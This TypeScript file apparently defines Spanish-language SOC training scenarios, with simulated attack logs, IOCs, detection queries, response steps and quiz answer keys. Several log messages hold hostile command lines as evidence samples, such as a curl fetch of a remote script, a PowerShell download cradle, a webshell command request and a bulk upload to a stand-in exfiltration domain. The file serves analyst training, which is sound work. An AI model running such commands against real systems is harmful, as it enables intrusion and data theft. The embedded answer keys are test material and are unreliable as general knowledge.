import type { AttackEvent, ScenarioDefinition } from './model.js';
import type { EventSource, MitreTechnique } from '../domain/types.js';

interface CaseSpec {
  id: string; title: string; difficulty: ScenarioDefinition['difficulty']; category: string;
  severity: ScenarioDefinition['severity']; description: string; briefing: string;
  host: string; user: string; sourceIp: string; technique: MitreTechnique;
  alerts: string[]; iocs: ScenarioDefinition['iocs']; events: AttackEvent[];
  explanation: string; response: string[]; kql: string[]; spl: string[]; sigmaSelection: string;
}

const event = (
  offsetMinutes: number, source: EventSource, host: string, user: string, sourceIp: string,
  eventCode: string, action: string, outcome: AttackEvent['outcome'], message: string,
  details: AttackEvent['details'] = {},
): AttackEvent => ({
  offsetMinutes, source, host, user, sourceIp, destinationIp: '10.40.12.10', eventCode,
  action, outcome, message, tags: ['attack', 'training-evidence'], details,
});

const specs: CaseSpec[] = [
  {
    id: 'ssh-brute-force', title: 'SSH brute force contra bastión', difficulty: 'Foundation',
    category: 'Initial Access', severity: 'high', host: 'bastion-01', user: 'deploy', sourceIp: '185.220.101.34',
    description: 'Una ráfaga de autenticaciones SSH precede a un acceso correcto desde un origen no habitual.',
    briefing: 'El IDS detectó un aumento brusco de fallos SSH en el bastión público. Determina si hubo compromiso y reconstruye la secuencia.',
    technique: { id: 'T1110.001', name: 'Password Guessing', tactic: 'Credential Access' },
    alerts: ['18 fallos SSH en 90 segundos', 'Inicio de sesión desde ASN no habitual'],
    iocs: [{ type: 'ip', value: '185.220.101.34', context: 'Origen de los intentos y del acceso correcto' }],
    events: [
      event(9, 'auth', 'bastion-01', 'deploy', '185.220.101.34', 'sshd-01', 'ssh_login', 'failure', 'Failed password for deploy from 185.220.101.34 port 41902 ssh2', { attempts: 12 }),
      event(11, 'auth', 'bastion-01', 'root', '185.220.101.34', 'sshd-01', 'ssh_login', 'failure', 'Invalid user root from 185.220.101.34 port 41918', { attempts: 6 }),
      event(13, 'auth', 'bastion-01', 'deploy', '185.220.101.34', 'sshd-01', 'ssh_login', 'success', 'Accepted password for deploy from 185.220.101.34 port 42001 ssh2'),
      event(15, 'linux', 'bastion-01', 'deploy', '185.220.101.34', 'execve', 'process_start', 'success', 'COMMAND=/usr/bin/curl -fsSL hxxp://185.220.101.34/i.sh', { process: 'curl' }),
    ],
    explanation: 'El mismo origen provoca 18 fallos, logra autenticarse como deploy y lanza curl dos minutos después. La correlación confirma un verdadero positivo.',
    response: ['Aislar bastion-01 de la red', 'Bloquear 185.220.101.34', 'Rotar las credenciales de deploy', 'Revisar authorized_keys y procesos persistentes'],
    kql: ['host.name:"bastion-01" and event.category:authentication', 'source.ip:"185.220.101.34"'],
    spl: ['index=soc host=bastion-01 sourcetype=linux:auth', 'index=soc src_ip=185.220.101.34 | sort _time'], sigmaSelection: 'source.ip: 185.220.101.34'
  },
  {
    id: 'password-spraying', title: 'Password spraying en Microsoft 365', difficulty: 'Foundation',
    category: 'Credential Access', severity: 'high', host: 'entra-id', user: 'marta.sanz', sourceIp: '45.133.1.77',
    description: 'Un único origen prueba una contraseña común contra múltiples identidades y obtiene una sesión.',
    briefing: 'El equipo IAM observa fallos dispersos que no superan el umbral por usuario. Busca el patrón horizontal y el acceso exitoso.',
    technique: { id: 'T1110.003', name: 'Password Spraying', tactic: 'Credential Access' },
    alerts: ['Fallos para 14 usuarios desde una IP', 'Inicio de sesión con propiedades anómalas'],
    iocs: [{ type: 'ip', value: '45.133.1.77', context: 'Origen del spray' }, { type: 'user', value: 'marta.sanz', context: 'Cuenta comprometida' }],
    events: [
      event(8, 'auth', 'entra-id', 'carlos.vera', '45.133.1.77', 'AADSTS50126', 'cloud_login', 'failure', 'Invalid username or password', { application: 'OfficeHome' }),
      event(10, 'auth', 'entra-id', 'marta.sanz', '45.133.1.77', 'AADSTS50126', 'cloud_login', 'failure', 'Invalid username or password', { targeted_users: 14 }),
      event(18, 'auth', 'entra-id', 'marta.sanz', '45.133.1.77', '0', 'cloud_login', 'success', 'Interactive sign-in completed without MFA', { country: 'NL' }),
      event(21, 'http', 'exchange-online', 'marta.sanz', '45.133.1.77', 'MailItemsAccessed', 'mail_read', 'success', 'Mailbox messages accessed via browser', { count: 43 }),
    ],
    explanation: 'La IP reparte intentos entre 14 cuentas para evadir bloqueos. La sesión de marta.sanz sin MFA y el acceso inmediato al buzón confirman compromiso.',
    response: ['Revocar sesiones de marta.sanz', 'Restablecer su contraseña', 'Exigir MFA resistente a phishing', 'Bloquear el origen y revisar reglas de buzón'],
    kql: ['event.category:authentication and source.ip:"45.133.1.77"', 'user.name:"marta.sanz" and event.outcome:success'],
    spl: ['index=soc src_ip=45.133.1.77 action=failure | stats dc(user) by src_ip', 'index=soc user=marta.sanz action=success'], sigmaSelection: 'source.ip: 45.133.1.77'
  },
  {
    id: 'credential-stuffing', title: 'Credential stuffing en portal VPN', difficulty: 'Intermediate',
    category: 'Initial Access', severity: 'high', host: 'vpn-gw-02', user: 'a.ruiz', sourceIp: '91.214.124.18',
    description: 'Credenciales reutilizadas permiten acceder al portal VPN tras intentos de una botnet pequeña.',
    briefing: 'Correlaciona los accesos al portal con la asignación de túneles y la actividad interna posterior.',
    technique: { id: 'T1110.004', name: 'Credential Stuffing', tactic: 'Credential Access' },
    alerts: ['Autenticaciones desde proxy residencial', 'Nuevo dispositivo VPN sin postura válida'],
    iocs: [{ type: 'ip', value: '91.214.124.18', context: 'Nodo de proxy que obtuvo acceso' }],
    events: [
      event(12, 'http', 'vpn-gw-02', 'a.ruiz', '91.214.124.18', '401', 'vpn_login', 'failure', 'Portal rejected reused credential pair', { user_agent: 'python-requests/2.32' }),
      event(16, 'auth', 'vpn-gw-02', 'a.ruiz', '91.214.124.18', 'VPN-200', 'vpn_login', 'success', 'VPN login succeeded from unregistered device'),
      event(17, 'network', 'vpn-gw-02', 'a.ruiz', '91.214.124.18', 'TUNNEL-UP', 'tunnel_create', 'success', 'Assigned internal address 10.99.4.23', { assigned_ip: '10.99.4.23' }),
      event(22, 'network', 'files-01', 'a.ruiz', '10.99.4.23', 'SMB-5145', 'share_access', 'success', 'Finance share enumerated over SMB'),
    ],
    explanation: 'El user-agent automatizado, el dispositivo desconocido y la enumeración SMB posterior demuestran uso de credenciales filtradas.',
    response: ['Desconectar el túnel VPN', 'Revocar credenciales y sesiones', 'Forzar MFA', 'Revisar accesos a files-01'],
    kql: ['host.name:"vpn-gw-02" and user.name:"a.ruiz"', 'source.ip:"91.214.124.18"'],
    spl: ['index=soc host=vpn-gw-02 user=a.ruiz', 'index=soc src_ip=91.214.124.18'], sigmaSelection: 'source.ip: 91.214.124.18'
  },
  {
    id: 'suspicious-powershell', title: 'PowerShell codificado en estación financiera', difficulty: 'Intermediate',
    category: 'Execution', severity: 'critical', host: 'fin-wks-07', user: 'laura.gil', sourceIp: '10.40.21.57',
    description: 'Sysmon registra una cadena PowerShell codificada, descarga y persistencia en una estación sensible.',
    briefing: 'Analiza la genealogía de procesos, la conexión saliente y los cambios de persistencia.',
    technique: { id: 'T1059.001', name: 'PowerShell', tactic: 'Execution' },
    alerts: ['PowerShell con -EncodedCommand', 'Conexión desde powershell.exe', 'Tarea programada creada'],
    iocs: [{ type: 'domain', value: 'cdn-sync-updates.example', context: 'Dominio de descarga sintético' }, { type: 'process', value: 'powershell.exe', context: 'Proceso de ejecución' }],
    events: [
      event(7, 'sysmon', 'fin-wks-07', 'laura.gil', '10.40.21.57', '1', 'process_start', 'success', 'WINWORD.EXE spawned powershell.exe -NoP -EncodedCommand SQBFAFgA', { parent: 'WINWORD.EXE', process: 'powershell.exe' }),
      event(8, 'sysmon', 'fin-wks-07', 'laura.gil', '10.40.21.57', '3', 'network_connection', 'success', 'powershell.exe connected to cdn-sync-updates.example:443', { domain: 'cdn-sync-updates.example' }),
      event(10, 'windows', 'fin-wks-07', 'laura.gil', '10.40.21.57', '4104', 'script_block', 'success', 'IEX (New-Object Net.WebClient).DownloadString(...)'),
      event(13, 'windows', 'fin-wks-07', 'SYSTEM', '10.40.21.57', '4698', 'scheduled_task_create', 'success', 'Scheduled task OfficeTelemetryUpdate created'),
    ],
    explanation: 'Word inicia PowerShell codificado, que descarga contenido y crea una tarea. La cadena de procesos y persistencia confirma ejecución maliciosa.',
    response: ['Aislar fin-wks-07', 'Finalizar PowerShell y preservar memoria', 'Eliminar la tarea tras adquirir evidencias', 'Bloquear el dominio y buscarlo en el entorno'],
    kql: ['host.name:"fin-wks-07" and process.name:"powershell.exe"', 'winlog.event_id:(4104 or 4698)'],
    spl: ['index=soc host=fin-wks-07 process_name=powershell.exe', 'index=soc EventCode IN (4104,4698)'], sigmaSelection: 'CommandLine|contains: -EncodedCommand'
  },
  {
    id: 'phishing-payload', title: 'Phishing con documento señuelo', difficulty: 'Intermediate',
    category: 'Initial Access', severity: 'critical', host: 'sales-wks-12', user: 'pablo.mora', sourceIp: '198.51.100.42',
    description: 'Un adjunto ofimático desencadena una descarga y ejecución desde el perfil del usuario.',
    briefing: 'Une los registros del gateway de correo, proxy y endpoint para determinar el impacto.',
    technique: { id: 'T1566.001', name: 'Spearphishing Attachment', tactic: 'Initial Access' },
    alerts: ['Adjunto con macro desde dominio reciente', 'Proceso Office crea binario'],
    iocs: [{ type: 'domain', value: 'invoices-share.example', context: 'Entrega del payload sintético' }, { type: 'hash', value: '9f2a7d1b8e4c-synthetic', context: 'SHA256 abreviado del archivo de práctica' }],
    events: [
      event(5, 'http', 'mail-gw-01', 'pablo.mora', '198.51.100.42', 'SMTP-250', 'mail_deliver', 'success', 'Invoice_Q3.docm delivered from billing@vendor-notice.example', { attachment: 'Invoice_Q3.docm' }),
      event(9, 'sysmon', 'sales-wks-12', 'pablo.mora', '10.40.22.112', '1', 'process_start', 'success', 'WINWORD.EXE spawned mshta.exe', { parent: 'WINWORD.EXE', process: 'mshta.exe' }),
      event(10, 'http', 'sales-wks-12', 'pablo.mora', '10.40.22.112', '200', 'download', 'success', 'GET https://invoices-share.example/a.hta', { bytes: 18432 }),
      event(12, 'sysmon', 'sales-wks-12', 'pablo.mora', '10.40.22.112', '11', 'file_create', 'success', 'File created C:\\Users\\pablo.mora\\AppData\\Local\\svchost32.exe', { hash: '9f2a7d1b8e4c-synthetic' }),
    ],
    explanation: 'El documento con macro inicia mshta, descarga una HTA y deposita un ejecutable en AppData. Las tres fuentes forman una cadena consistente.',
    response: ['Aislar sales-wks-12', 'Purgar el mensaje de otros buzones', 'Bloquear remitente, dominio y hash', 'Restablecer credenciales del usuario'],
    kql: ['process.parent.name:"WINWORD.EXE" and process.name:"mshta.exe"', 'url.domain:"invoices-share.example"'],
    spl: ['index=soc parent_process=WINWORD.EXE process=mshta.exe', 'index=soc domain=invoices-share.example'], sigmaSelection: 'ParentImage|endswith: WINWORD.EXE'
  },
  {
    id: 'dns-tunneling', title: 'Túnel DNS desde equipo de I+D', difficulty: 'Advanced',
    category: 'Command and Control', severity: 'high', host: 'rnd-wks-03', user: 'n.ortega', sourceIp: '10.40.30.43',
    description: 'Subdominios de alta entropía y respuestas regulares sugieren encapsulación de datos en DNS.',
    briefing: 'Distingue el tráfico legítimo de telemetría del patrón de túnel y estima su inicio.',
    technique: { id: 'T1071.004', name: 'DNS', tactic: 'Command and Control' },
    alerts: ['Alta entropía en subdominios', 'Cadencia DNS periódica durante 26 minutos'],
    iocs: [{ type: 'domain', value: 'telemetry-sync.example', context: 'Dominio de túnel reservado para laboratorio' }],
    events: [
      event(4, 'dns', 'rnd-wks-03', 'n.ortega', '10.40.30.43', 'DNS-Q', 'dns_query', 'success', 'Query A MFRGGZDFMZTWQ2LK.telemetry-sync.example', { entropy: 4.71, qtype: 'A' }),
      event(7, 'dns', 'rnd-wks-03', 'n.ortega', '10.40.30.43', 'DNS-Q', 'dns_query', 'success', 'Query TXT ON2XEZJOOR4HI.telemetry-sync.example', { entropy: 4.63, qtype: 'TXT' }),
      event(13, 'network', 'rnd-wks-03', 'n.ortega', '10.40.30.43', 'FLOW', 'dns_transfer', 'success', 'Outbound DNS volume exceeded host baseline', { queries: 164, bytes: 48120 }),
      event(30, 'dns', 'rnd-wks-03', 'n.ortega', '10.40.30.43', 'DNS-Q', 'dns_query', 'success', 'Query TXT NZXXE3DE.telemetry-sync.example', { entropy: 4.58 }),
    ],
    explanation: 'Etiquetas codificadas, alta entropía, consultas TXT y cadencia sostenida desde un solo host encajan con exfiltración sobre DNS.',
    response: ['Aislar rnd-wks-03', 'Bloquear el dominio en el resolvedor', 'Capturar DNS histórico', 'Buscar el proceso originador con EDR'],
    kql: ['dns.question.registered_domain:"telemetry-sync.example"', 'host.name:"rnd-wks-03" and dns.question.type:TXT'],
    spl: ['index=soc sourcetype=dns query="*.telemetry-sync.example"', 'index=soc host=rnd-wks-03 qtype=TXT'], sigmaSelection: 'query|endswith: .telemetry-sync.example'
  },
  {
    id: 'malware-beaconing', title: 'Beaconing TLS de baja frecuencia', difficulty: 'Advanced',
    category: 'Command and Control', severity: 'high', host: 'ops-wks-19', user: 'svc.inventory', sourceIp: '10.40.18.89',
    description: 'Conexiones TLS pequeñas y periódicas revelan un implante sintético oculto entre tráfico web.',
    briefing: 'Calcula la periodicidad, identifica el proceso y diferencia el beacon de las actualizaciones legítimas.',
    technique: { id: 'T1071.001', name: 'Web Protocols', tactic: 'Command and Control' },
    alerts: ['Conexiones cada 60 segundos con jitter bajo', 'Binario sin firma inicia TLS'],
    iocs: [{ type: 'ip', value: '203.0.113.88', context: 'Servidor C2 sintético' }, { type: 'path', value: 'C:\\ProgramData\\diaghost.exe', context: 'Implante de laboratorio' }],
    events: [
      event(6, 'sysmon', 'ops-wks-19', 'svc.inventory', '10.40.18.89', '1', 'process_start', 'success', 'C:\\ProgramData\\diaghost.exe started', { signed: false }),
      event(7, 'network', 'ops-wks-19', 'svc.inventory', '10.40.18.89', 'TLS', 'tls_connect', 'success', 'TLS connection to 203.0.113.88:443', { bytes_out: 712, ja3: '72a589da586844d7' }),
      event(8, 'network', 'ops-wks-19', 'svc.inventory', '10.40.18.89', 'TLS', 'tls_connect', 'success', 'TLS connection to 203.0.113.88:443', { interval_seconds: 60, bytes_out: 704 }),
      event(9, 'suricata', 'ops-wks-19', 'svc.inventory', '10.40.18.89', 'SURICATA-2100498', 'c2_beacon', 'unknown', 'ET MALWARE Possible Meterpreter-like Beacon', { destination: '203.0.113.88' }),
    ],
    explanation: 'El binario no firmado inicia conexiones casi idénticas cada 60 segundos al mismo destino. La regularidad y el JA3 estable confirman beaconing.',
    response: ['Aislar ops-wks-19', 'Bloquear 203.0.113.88', 'Adquirir memoria y diaghost.exe', 'Buscar el hash y JA3 en toda la red'],
    kql: ['destination.ip:"203.0.113.88"', 'process.executable:"C:\\\\ProgramData\\\\diaghost.exe"'],
    spl: ['index=soc dest_ip=203.0.113.88 | streamstats current=f last(_time) as prev', 'index=soc process_path="*diaghost.exe"'], sigmaSelection: 'DestinationIp: 203.0.113.88'
  },
  {
    id: 'webshell', title: 'Webshell en servidor de soporte', difficulty: 'Advanced',
    category: 'Persistence', severity: 'critical', host: 'web-support-01', user: 'www-data', sourceIp: '203.0.113.146',
    description: 'Una subida anómala termina en ejecución de comandos y conexiones salientes desde el proceso web.',
    briefing: 'Investiga access logs, integridad de ficheros y procesos hijos del servidor web.',
    technique: { id: 'T1505.003', name: 'Web Shell', tactic: 'Persistence' },
    alerts: ['POST a endpoint de subida', 'nginx crea shell del sistema'],
    iocs: [{ type: 'path', value: '/var/www/html/uploads/.cache.php', context: 'Webshell sintética' }, { type: 'ip', value: '203.0.113.146', context: 'Operador del laboratorio' }],
    events: [
      event(5, 'http', 'web-support-01', 'anonymous', '203.0.113.146', '200', 'file_upload', 'success', 'POST /api/ticket/attachment filename=.cache.php', { bytes: 2381 }),
      event(6, 'linux', 'web-support-01', 'www-data', '203.0.113.146', 'FIM', 'file_create', 'success', 'Created /var/www/html/uploads/.cache.php'),
      event(12, 'http', 'web-support-01', 'www-data', '203.0.113.146', '200', 'web_request', 'success', 'GET /uploads/.cache.php?cmd=id'),
      event(12.2, 'linux', 'web-support-01', 'www-data', '203.0.113.146', 'execve', 'process_start', 'success', 'nginx worker spawned /bin/sh -c id', { parent: 'nginx', process: '/bin/sh' }),
    ],
    explanation: 'La subida oculta, su creación en el webroot y la ejecución de /bin/sh por nginx constituyen evidencia directa de webshell.',
    response: ['Retirar web-support-01 del balanceador', 'Preservar y poner en cuarentena .cache.php', 'Corregir la validación de subidas', 'Rotar secretos accesibles por www-data'],
    kql: ['url.path:"/uploads/.cache.php"', 'process.parent.name:"nginx" and process.name:("sh" or "bash")'],
    spl: ['index=soc uri_path="/uploads/.cache.php"', 'index=soc parent_process=nginx process IN (sh,bash)'], sigmaSelection: 'process.parent.name: nginx'
  },
  {
    id: 'privilege-escalation', title: 'Escalada local mediante servicio vulnerable', difficulty: 'Intermediate',
    category: 'Privilege Escalation', severity: 'critical', host: 'hr-wks-04', user: 'javier.lago', sourceIp: '10.40.25.24',
    description: 'Un usuario estándar modifica un servicio y obtiene una consola con privilegios SYSTEM.',
    briefing: 'Correlaciona cambios de servicio, procesos y asignación de privilegios en Windows.',
    technique: { id: 'T1543.003', name: 'Windows Service', tactic: 'Privilege Escalation' },
    alerts: ['Configuración de servicio modificada', 'cmd.exe ejecutado como SYSTEM'],
    iocs: [{ type: 'path', value: 'C:\\Users\\Public\\updater.exe', context: 'Binario sintético usado para escalada' }],
    events: [
      event(6, 'windows', 'hr-wks-04', 'javier.lago', '10.40.25.24', '4672', 'privilege_check', 'failure', 'Requested SeDebugPrivilege from standard session'),
      event(9, 'windows', 'hr-wks-04', 'javier.lago', '10.40.25.24', '7040', 'service_change', 'success', 'ImagePath of LegacyUpdater changed to C:\\Users\\Public\\updater.exe'),
      event(10, 'windows', 'hr-wks-04', 'SYSTEM', '10.40.25.24', '7036', 'service_start', 'success', 'LegacyUpdater entered the running state'),
      event(10.1, 'sysmon', 'hr-wks-04', 'SYSTEM', '10.40.25.24', '1', 'process_start', 'success', 'updater.exe spawned cmd.exe as NT AUTHORITY\\SYSTEM', { integrity: 'System' }),
    ],
    explanation: 'El usuario cambia ImagePath de un servicio arrancable y el servicio ejecuta su binario como SYSTEM, una escalada confirmada.',
    response: ['Aislar hr-wks-04', 'Detener y deshabilitar LegacyUpdater', 'Corregir ACL del servicio', 'Revisar acciones realizadas como SYSTEM'],
    kql: ['host.name:"hr-wks-04" and winlog.event_id:(7040 or 7036)', 'user.name:"SYSTEM" and process.name:"cmd.exe"'],
    spl: ['index=soc host=hr-wks-04 EventCode IN (7040,7036)', 'index=soc user=SYSTEM process=cmd.exe'], sigmaSelection: 'winlog.event_id: 7040'
  },
  {
    id: 'data-exfiltration', title: 'Exfiltración a almacenamiento cloud', difficulty: 'Advanced',
    category: 'Exfiltration', severity: 'critical', host: 'legal-wks-02', user: 'ines.prado', sourceIp: '10.40.26.32',
    description: 'Un archivo voluminoso se comprime y transfiere a un servicio cloud no aprobado.',
    briefing: 'Reconstruye preparación, compresión y salida de los datos; cuantifica el volumen transferido.',
    technique: { id: 'T1567.002', name: 'Exfiltration to Cloud Storage', tactic: 'Exfiltration' },
    alerts: ['Archivo de contratos comprimido', 'Carga de 286 MB a cloud no autorizado'],
    iocs: [{ type: 'domain', value: 'dropfiles-storage.example', context: 'Destino sintético de exfiltración' }, { type: 'path', value: 'C:\\Users\\ines.prado\\Temp\\cases.7z', context: 'Archivo preparado' }],
    events: [
      event(7, 'windows', 'legal-wks-02', 'ines.prado', '10.40.26.32', '4663', 'file_access', 'success', 'Bulk read of D:\\Legal\\ActiveCases', { files: 1842 }),
      event(12, 'sysmon', 'legal-wks-02', 'ines.prado', '10.40.26.32', '1', 'process_start', 'success', '7z.exe a C:\\Users\\ines.prado\\Temp\\cases.7z D:\\Legal\\ActiveCases', { process: '7z.exe' }),
      event(18, 'http', 'legal-wks-02', 'ines.prado', '10.40.26.32', 'PUT-200', 'upload', 'success', 'PUT https://dropfiles-storage.example/upload/cases.7z', { bytes: 299892736 }),
      event(19, 'network', 'proxy-01', 'ines.prado', '10.40.26.32', 'DLP-77', 'data_loss_alert', 'unknown', '286 MB upload exceeded user baseline by 24x'),
    ],
    explanation: 'La lectura masiva, la compresión con 7-Zip y la carga de 286 MB al dominio no autorizado prueban preparación y exfiltración.',
    response: ['Bloquear la carga y el dominio', 'Aislar legal-wks-02', 'Preservar cases.7z y logs del proxy', 'Notificar a Legal y privacidad para evaluar impacto'],
    kql: ['user.name:"ines.prado" and event.action:(file_access or upload)', 'url.domain:"dropfiles-storage.example"'],
    spl: ['index=soc user=ines.prado (action=file_access OR action=upload)', 'index=soc domain=dropfiles-storage.example'], sigmaSelection: 'url.domain: dropfiles-storage.example'
  }
];

function makeDefinition(spec: CaseSpec): ScenarioDefinition {
  const questions: ScenarioDefinition['questions'] = [
    { id: 'host', prompt: '¿Qué host está comprometido?', type: 'text', points: 20 },
    { id: 'user', prompt: '¿Qué usuario está asociado a la actividad?', type: 'text', points: 15 },
    { id: 'source', prompt: '¿Cuál es la IP de origen relevante?', type: 'text', points: 15 },
    { id: 'technique', prompt: '¿Qué técnica MITRE ATT&CK describe mejor el patrón?', type: 'single', options: [spec.technique.id, 'T1055', 'T1047', 'T1087'], points: 20 },
    { id: 'verdict', prompt: '¿Es un verdadero positivo?', type: 'boolean', points: 15 },
    { id: 'containment', prompt: 'Indica la primera medida de contención.', type: 'text', points: 15 },
  ];
  return {
    id: spec.id, title: spec.title, difficulty: spec.difficulty, category: spec.category,
    severity: spec.severity, description: spec.description, briefing: spec.briefing,
    primaryUser: spec.user, primaryHost: spec.host,
    users: [...new Set([spec.user, 'svc.backup', 'mlopez', 'administrator'])],
    hosts: [...new Set([spec.host, 'dc-01', 'proxy-01', 'dns-01'])], alerts: spec.alerts,
    attackEvents: spec.events, questions,
    answers: {
      host: { value: spec.host, explanation: `Los eventos correlacionados convergen en ${spec.host}.` },
      user: { value: spec.user, explanation: `${spec.user} aparece en la cadena de actividad relevante.` },
      source: { value: spec.sourceIp, explanation: `${spec.sourceIp} es el origen que conecta los eventos.` },
      technique: { value: spec.technique.id, aliases: [spec.technique.name], explanation: `${spec.technique.id}: ${spec.technique.name}.` },
      verdict: { value: true, aliases: ['true', 'sí', 'si', 'verdadero positivo', 'true positive'], explanation: 'La telemetría de varias fuentes confirma actividad maliciosa.' },
      containment: { value: spec.response[0], aliases: ['aislar', 'bloquear', 'revocar', 'desconectar', 'retirar'], explanation: `Primera acción recomendada: ${spec.response[0]}.` },
    },
    iocs: spec.iocs, mitre: [spec.technique], explanation: spec.explanation,
    reasoning: ['Establecer una línea temporal común entre fuentes.', 'Separar el ruido benigno de la secuencia causal.', 'Validar identidad, host y origen antes de clasificar.', 'Priorizar contención reversible y preservación de evidencia.'],
    queries: {
      kql: spec.kql, spl: spec.spl,
      sigma: `title: ${spec.title}\nstatus: experimental\nlogsource:\n  category: security\ndetection:\n  selection:\n    ${spec.sigmaSelection}\n  condition: selection\nfalsepositives:\n  - Validar con el propietario del activo\nlevel: ${spec.severity}`,
    },
    responseActions: spec.response,
  };
}

export const scenarioDefinitions = specs.map(makeDefinition);
export const scenarioById = new Map(scenarioDefinitions.map((scenario) => [scenario.id, scenario]));
